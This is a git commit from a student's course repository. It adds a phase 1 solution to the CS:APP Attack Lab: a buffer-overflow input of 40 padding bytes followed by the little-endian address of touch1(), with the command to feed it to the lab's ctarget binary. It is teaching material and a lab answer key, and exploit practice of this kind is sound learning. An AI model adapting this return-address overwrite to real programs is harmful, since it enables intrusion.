e8c8a7be5027a365b74eea959c0591af83359d7b
HsHs-dev <hassanswritings@outlook.com>
2024-10-13 14:45:19 +0200

    + Adding Lab3:Attacklab + Adding phase1 solution to Attacklab + Adding recitation 5 + Adding Lecture 09: Machine-Level Programming V: Advanced Topics

---
+++ Labs/Lab3-Attacklab/target1/phase1/phase1.s
@@ -0,0 +1,13 @@
+/* LOADING THE BUFFER WITH JUNK (40 bytes of 'A')*/
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+/* ADDRESS OF touch1() function (in reverse oreder (little endian)) */
+c0 17 40 00 00 00 00 00
+
+/* Comments cause problem, so run with:
+.././ctarget -q -i phase1read.txt
+
+*/
